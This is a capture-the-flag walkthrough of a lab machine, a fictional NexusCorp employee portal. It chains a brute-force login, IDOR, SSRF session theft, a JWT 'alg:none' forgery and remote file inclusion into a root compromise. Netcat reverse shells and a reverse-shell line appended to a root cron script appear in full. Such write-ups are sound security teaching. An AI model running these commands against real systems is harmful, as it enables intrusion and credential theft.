## Domino - THM
Oct 11, 2026 · @Gh0ulH4x
### Objective
- This walkthrough compromises the NexusCorp Employee Portal by chaining a string of small, individually-minor weaknesses — an exposed backup with a hardcoded decryption key, credential brute-forcing, a horizontal IDOR, an SSRF-driven session hijack, a JWT `alg:none` forgery, file-inclusion-based RCE, credential reuse over SSH, and finally a writable root-owned cron script — into full root compromise.
----
## Machine Info 
- `NexusCorp` Employee Portal is a typical internal application with authentication controls and role-based access in place. The objective is black-box: observe how the application behaves, interact with its endpoints, identify weak trust boundaries, and chain discovered weaknesses together to progressively escalate access.

| Item           | Value                                                 |
| -------------- | ----------------------------------------------------- |
| Target IP      | `10.48.165.130`                                       |
| Application    | NexusCorp Portal (PHP / Apache)                       |
| Initial access | None provided — fully unauthenticated black-box start |
## Enumeration
- Network Scanning
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 8f:5f:4b:13:e7:bc:af:2f:86:e1:9e:b5:cb:14:39:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHRHyxQ2leMmECS5RyxyyWs52BhrWDhpQp+2CQ+mS/eJFJMdG0nMjf2qyuLHpZPZN+UNksG28fycf/dU4aP+9hs=
|   256 be:ae:34:5a:56:f0:ff:dd:ab:19:1a:0c:5b:d6:f4:e0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICGugFphRrbCoP9Rhoimy67XdAyOR844QGDQ0+ZZmxpu
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: NexusCorp Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
```
---
### Web Application — Port 80

The login page links to `/forgot.php` and `/team.php`. The team page lists employee names, which were scraped for a username/email wordlist:
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>NexusCorp Portal</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body class="login-page">
<div class="login-box">
  <div class="logo"><span class="logo-icon">&#9650;</span> NexusCorp</div>
  <h2>Employee Portal</h2>
    <form method="POST" action="/index.php">
    <div class="form-group">
      <label>Username</label>
      <input type="text" name="username" placeholder="firstname.lastname" required>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Password" required>
    </div>
    <button type="submit" class="btn-primary">Sign In</button>
  </form>
  <div class="links">
    <a href="/forgot.php">Forgot password?</a> - <a href="/team.php">Our Team</a> 
  </div>
</div>
</body>
</html>
```
- Links - `/forget.php` & `/team.php`
- Scrap users data from `/team`
```bash
$ cewl  http://10.48.165.130/team.php -w users.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

┌──(kali㉿kali)-[~]
└─$ cewl -e  http://10.48.165.130/team.php -w mails.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```
- Got the `E-Mails` & `Name` 
#### Directory Enumeration
```bash
$ gobuster dir -u $URL -w /usr/share/wordlists/dirb/big.txt -t 50

.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
admin                [--> http://10.48.165.130/admin/]
api                  [--> http://10.48.165.130/api/]
backup               [--> http://10.48.165.130/backup/]
javascript           [--> http://10.48.165.130/javascript/]
server-status        (Status: 403) [Size: 278]
static               [--> http://10.48.165.130/static/]
support              [--> http://10.48.165.130/support/]

```
#### Exposed Backup & Hardcoded Key
`/backup` listed `README.txt` and `config.enc`:
```
Index of /backup
README.txt
config.enc
```
- `README.txt` Content 
```note
NexusCorp Backup Configuration
================================
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```
- Download `config.enc` file 
- `static/app.js` contained a developer comment hardcoding the AES key directly in client-side JS:
```js
// NexusCorp Portal - Frontend Utilities
// v2.3.1 - Build 20241115

(function() {
    'use strict';

    // Configuration (TODO: move to env before prod deployment - laura 2024-10-22)
    const CONFIG = {
        apiBase: '/api',
        // Encryption key for backup config decryption - AES-ECB-128
        // Key: N3xusK3y2024!!  (pad to 16 bytes with �)
        _backupKey: 'N3xusK3y2024!!',
        appVersion: '2.3.1'
    };

    // Session helper
    window.NexusApp = {
        getSession: function() {
            const cookie = document.cookie.split(';').find(c => c.trim().startsWith('nexus_session='));
            if (!cookie) return null;
            try {
                return JSON.parse(atob(cookie.split('=')[1].trim()));
            } catch(e) { return null; }
        },
        getApiToken: function() {
            return localStorage.getItem('nexus_jwt');
        },
        setApiToken: function(token) {
            localStorage.setItem('nexus_jwt', token);
        }
    };

    // Auto-fetch JWT if not cached
    if (!localStorage.getItem('nexus_jwt') && document.cookie.includes('nexus_session')) {
        fetch('/api/auth/token.php', {credentials: 'include'})
            .then(r => r.json())
            .then(d => { if (d.token) localStorage.setItem('nexus_jwt', d.token); })
            .catch(() => {});
    }
})();
```
- Decrypting the Backup
```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt_file(encrypted_file_path: str, output_file_path: str, raw_key: str):
    # 1. Prepare the 16-byte key (pad with null bytes \x00 to reach 16 bytes)
    # If null bytes don't work, try padding with spaces: raw_key.ljust(16, ' ').encode('utf-8')
    key = raw_key.encode('utf-8').ljust(16, b'\x00')

    assert len(key) == 16, "Key must be exactly 16 bytes"

    # 2. Read the encrypted file
    with open(encrypted_file_path, 'rb') as f:
        ciphertext = f.read()

    # 3. Set up AES-128-ECB decryptor
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()

    # 4. Decrypt
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    # 5. Remove PKCS#7 / standard padding if applicable
    # (Inspect the output; if it has trailing padding bytes, strip them)
    try:
        padding_length = padded_plaintext[-1]
        if padding_length <= 16:
            plaintext = padded_plaintext[:-padding_length]
        else:
            plaintext = padded_plaintext
    except Exception:
        plaintext = padded_plaintext

    # 6. Save or print the result
    with open(output_file_path, 'wb') as f:
        f.write(plaintext)

    print(f"[+] Decryption successful! Saved to {output_file_path}")

# Run the function
if __name__ == "__main__":
    encrypted_path = "/home/kali/Downloads/config.enc" # Change to your file name
    output_path = "decrypted_output.txt"
    key_string = "N3xusK3y2024!!"

    decrypt_file(encrypted_path, output_path, key_string)
```
- Decryption Message
```bash
$ cat decrypted_output.txt
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```
- This confirmed a real system username (`devops`) worth targeting for later credential reuse.
#### Initial Access — Brute Force
```bash
$ hydra -l robert.wilson -P /usr/share/wordlists/rockyou.txt 10.48.165.130 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -V
[ATTEMPT] target 10.48.165.130 - login "robert.wilson" - pass "michelle" - 25 of 14344400 [child 11] (0/0)
[ATTEMPT] target 10.48.165.130 - login "robert.wilson" - pass "tigger" - 26 of 14344400 [child 10] (0/0)
[80][http-post-form] host: 10.48.165.130   login: robert.wilson   password: password
```
- Found The Creds
```Creds
Username - robert.wilso
Password - Password
```
- Logged in as `robert.wilson` (role: `user`), landing on `/dashboard.php`, which exposed a file-viewer API endpoint and a profile API.
```bash
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Dashboard - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp</div>
  <div class="nav-links">
    <a href="/dashboard.php">Dashboard</a>
    <a href="/support/index.php">Support</a>
        <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <h1>Welcome, robert.wilson</h1>
  <div class="card-grid">
    <div class="card">
      <h3>My Profile</h3>
      <p><strong>Username:</strong> robert.wilson</p>
      <p><strong>Email:</strong> robert.wilson@nexus.corp</p>
      <p><strong>Role:</strong> user</p>
    </div>
    <div class="card">
      <h3>File Viewer</h3>
      <p>Access internal documents via the secure file API.</p>
      <p><small>Endpoint: <code>/api/files.php?name=</code></small></p>
      <p><small>Requires JWT authentication via <code>/api/auth/token.php</code></small></p>
    </div>
    <div class="card">
      <h3>Quick Links</h3>
      <ul>
        <li><a href="/support/index.php">Support Tickets</a></li>
        <li><a href="/support/create.php">Open Ticket</a></li>
        <li><a href="/api/users/profile.php?id=4">My Profile API</a></li>
      </ul>
    </div>
  </div>
</div>
</body>
</html>
``` 
- The dashboard linked to `/api/users/profile.php?id=4` ("My Profile API"). Changing the `id` parameter directly returned another user's full record, including an admin's notes field:
```bash
http://10.48.165.130/api/users/profile.php?id=4
{"id":4,"username":"robert.wilson","email":"robert.wilson@nexus.corp","role":"user","notes":""}

http://10.48.165.130/api/users/profile.php?id=1
{"id":1,"username":"laura.hayes","email":"laura.hayes@nexus.corp","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
```
- Flag1 
```Flag
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
```

- A JWT retrieved from `/api/auth/token.php` did not grant access to the file API, so attention shifted to `/support/create.php`, which fetched any URL placed in the ticket body without validating that it pointed back to the attacker's own listener (SSRF):

```bash
http://10.48.165.130//api/auth/token.php

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTE3MDgzMDEsImV4cCI6MTc5MTcxMTkwMX0.uqRY5zo5qbhsXo4QuBosB93a7CDQVwf1qyQq5hUBfig","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
```
- Listener :->
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def _log(self):
        print(f"\n--- {self.command} {self.path} ---")
        print("Headers:")
        for key, value in self.headers.items():
            print(f"  {key}: {value}")

        length = int(self.headers.get("Content-Length", 0))
        if length:
            body = self.rfile.read(length)
            print(f"Body ({length} bytes):")
            print(body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    do_GET = do_POST = do_PUT = do_DELETE = do_PATCH = do_HEAD = _log

if __name__ == "__main__":
    port = 80
    print(f"Listening on http://localhost:{port}")
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```
- Submitting a support ticket whose message body was the attacker's listener URL caused the backend to fetch it **using an admin's active session cookie**, leaking a forgeable admin session token:
```bash
─$ python3 server.py
Listening on http://localhost:80

--- GET / ---
Headers:
  Host: 192.168.178.7
  User-Agent: python-requests/2.31.0
  Accept-Encoding: gzip, deflate
  Accept: */*
  Connection: keep-alive
  Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
10.48.165.130 - - [11/Oct/2026 05:12:52] "GET / HTTP/1.1" 200 -
```
- JWT - `eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834`
- Replacing the `nexus_session` cookie value with the captured one granted admin access directly:
```bash
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
  <div class="nav-links">
    <a href="/dashboard.php">Portal</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <div class="admin-header">
    <h1>Administration Console</h1>
    <p>Logged in as: <strong>laura.hayes</strong></p>
  </div>
  <div class="flag-box">
    <h3>System Status</h3>
    <p>Internal reference: <code>THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</code></p>
  </div>
  <div class="card-grid">
    <div class="card">
      <h3>User Management</h3>
      <p>Manage employee accounts and permissions.</p>
      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
    </div>
    <div class="card">
      <h3>File System Access</h3>
      <p>Internal document viewer via authenticated API.</p>
      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
    </div>
    <div class="card">
      <h3>Support Queue</h3>
      <p>Pending tickets requiring admin review.</p>
      <p><strong>0</strong> unread tickets</p>    </div>
  </div>
</div>
</body>
</html>
```
- Second Flag Claimed 
```Flag
THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
```
### File-Inclusion RCE — JWT `alg:none` Forgery
- The file API required a Bearer JWT, but the token obtained via `/api/auth/token.php` only carried `role: user` even for `laura.hayes`. Since the JWT's signature wasn't actually verified server-side, an unsigned token (`alg: none`) with a forged `admin` role was crafted and accepted:
```bash
http://10.48.168.31/api/auth/token.php

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkxNzExNzYxLCJleHAiOjE3OTE3MTUzNjF9.sbqwGyETTie6ToeUy5GzTk1s5QDa4LADj3+z0GQyVSo","expires_in":3600,"note":"Use this token as: Authorization: Bearer <token> for \/api\/files.php"}
```
- This Token isn't `admin`, its `user`
```bash
$ python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'laura.hayes','role':'admin','iat':1791711761,'exp':1799999999}).encode()).rstrip(b'=')
print(header.decode() + '.' + payload.decode() + '.')
"
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibGF1cmEuaGF5ZXMiLCAicm9sZSI6ICJhZG1pbiIsICJpYXQiOiAxNzkxNzExNzYxLCAiZXhwIjogMTc5OTk5OTk5OX0.

$ TOKEN="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAibGF1cmEuaGF5ZXMiLCAicm9sZSI6ICJhZG1pbiIsICJpYXQiOiAxNzkxNzExNzYxLCAiZXhwIjogMTc5OTk5OTk5OX0."
```
- The file-viewer endpoint (`/api/files.php?name=`) turned out to accept a remote URL rather than a local path, fetching and executing arbitrary PHP from an attacker-controlled host:
```bash
└─$ nano shell.php

# Trigger the file
$ curl -s "http://10.48.168.31/api/files.php?name=http://192.168.178.7:80/shell.php" -H "Authorization: Bearer $TOKEN"

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.48.168.31 - - [11/Oct/2026 05:47:40] "GET /shell.php HTTP/1.1" 200 -
```
- Got the Reverse-shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.178.7] from (UNKNOWN) [10.48.168.31] 40146
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu SMP Thu May  7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 09:47:40 up 18 min,  0 user,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off

www-data@tryhackme-2404:/var/www/html$ ls
403.php  auth.php    dashboard.php		 index.php   static
admin	 backup      db12312312381203812093.php  logout.php  support
api	 config.php  forgot.php			 reset.php   team.php
www-data@tryhackme-2404:/var/www/html$ cat config.php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');

function get_db() {
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
www-data@tryhackme-2404:/var/www/html$
```
- Reading the application's own config file off disk exposed the database and JWT secrets directly which also the creds for user `devops`
```creds
Protocol - SSH
username - devops
password - D3v0ps!2024
```
- Flag3
```basgh
www-data@tryhackme-2404:/var/www/html$ find / -type f -iname "*flag*" 2>/dev/null
/proc/kpageflags
/opt/flag3.txt

www-data@tryhackme-2404:/opt$ ls
__pycache__  admin_bot.py  flag3.txt  monitoring  tools
www-data@tryhackme-2404:/opt$ cat flag3.txt
THM{rf1_2_rc3_f00th0ld_fl4g3}

$ ssh devops@10.48.168.31
The authenticity of host '10.48.168.31 (10.48.168.31)' can't be established.
ED25519 key fingerprint is: SHA256:X+t2TbVLzsj5J/GcBrVzwXE9+hoFGvwxNJkysLQTi7w
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Password : D3v0ps!2024
Last login: Sat May  9 17:13:11 2026 from 10.82.110.19
devops@tryhackme-2404:~$ ls
user.txt
devops@tryhackme-2404:~$ cat user.txt
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```
- Flag 3 & 4
```Flag
Flag 3 = THM{rf1_2_rc3_f00th0ld_fl4g3}
Flag 4 = THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```
----
## Privilege Escalation
- Privileges
```bash
devops@tryhackme-2404:~$ whoami
devops
devops@tryhackme-2404:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
devops@tryhackme-2404:~$ sudo -l
[sudo] password for devops: D3v0ps!2024
Sorry, user devops may not run sudo on tryhackme-2404.
```
- No `sudo` rights, but a writable `root`-owned script was found under `/opt`:
```bash
devops@tryhackme-2404:~$ find /opt/ -type f -writable 2>/dev/null
/opt/monitoring/health_report.sh
/opt/admin_bot.py

devops@tryhackme-2404:/opt/monitoring$ ls -la
total 12
drwxr-xr-x 2 root root   4096 Apr 29 10:27 .
drwxrwxrwx 5 root root   4096 May  7 20:26 ..
-rwxrwxr-- 1 root devops  537 May 18 10:41 health_report.sh
devops@tryhackme-2404:/opt/monitoring$
```
- `health_report.sh` is owned by root and group-writable by `devops`, and (per the flag 3 hint) is executed on a schedule by a root cron job. Appending a reverse shell to it:
```bash
nano health_report.sh
busybox nc 192.168.178.7 4445 -e sh
```
- `Root`-shell
```bash
$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.178.7] from (UNKNOWN) [10.48.168.31] 51194
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
cd
l -la
ls -la
total 36
drwx------    5 root     root          4096 Apr 29 11:00 .
drwxr-xr-x   22 root     root          4096 Oct 11 09:30 ..
-rw-------    1 root     root             5 Feb 17  2026 .bash_history
-rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
drwxr-xr-x    3 root     root          4096 Oct 22  2024 .local
-rw-r--r--    1 root     root           161 Dec  5  2019 .profile
drwx------    2 root     root          4096 Oct 22  2024 .ssh
-rw-------    1 root     root            29 Apr 29 11:00 root.txt
drwxr-xr-x    4 root     root          4096 Oct 22  2024 snap
cat root.txt
THM{pr1v3sc_cr0n_r00t_fl4g5}
```
- Root Flag 
```Flag
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

## Flags

```
Flag 1 (IDOR):                       @THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
Flag 2 (SSRF/session hijack):        @THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
Flag 3 (RFI/RCE foothold):           @THM{rf1_2_rc3_f00th0ld_fl4g3}
Flag 4 (SSH cred reuse):             @THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
Flag 5 (root/cron privesc):          @THM{pr1v3sc_cr0n_r00t_fl4g5}
```
### Attack Path Summary

1. Scraping the public `/team.php` page builds a username wordlist; directory brute-forcing finds an exposed `/backup` directory containing an encrypted config file, whose AES-128-ECB key is hardcoded in a client-side JS comment.
2. Decrypting the backup confirms a real system username (`devops`); brute-forcing the login form with that username context cracks a weak password for `robert.wilson`.
3. The dashboard's "My Profile API" is vulnerable to horizontal IDOR — changing the `id` parameter dumps another user's record, including an admin's notes field containing the first flag.
4. The support ticket creation feature is vulnerable to SSRF: pointing a ticket's message field at an attacker-controlled listener causes the backend to fetch it using an active admin session cookie, which is captured and replayed to hijack the admin session directly (second flag).
5. The file-viewer API's Bearer-JWT check doesn't actually verify the token signature, so an `alg:none` forged token with `role: admin` is accepted; the same endpoint accepts a remote URL instead of a local filename, fetching and executing an attacker-hosted PHP reverse shell.
6. The resulting `www-data` shell reads the application's own config file, recovering database credentials and JWT/app secrets, and a dropped flag file (third flag).
7. The recovered database password is reused as a valid SSH password for the `devops` system account (fourth flag).
8. `devops` has no sudo rights, but a root-owned, group-writable script under `/opt/monitoring`, executed periodically by a root cron job, is appended with a reverse-shell command — yielding a root shell and the final flag.
# END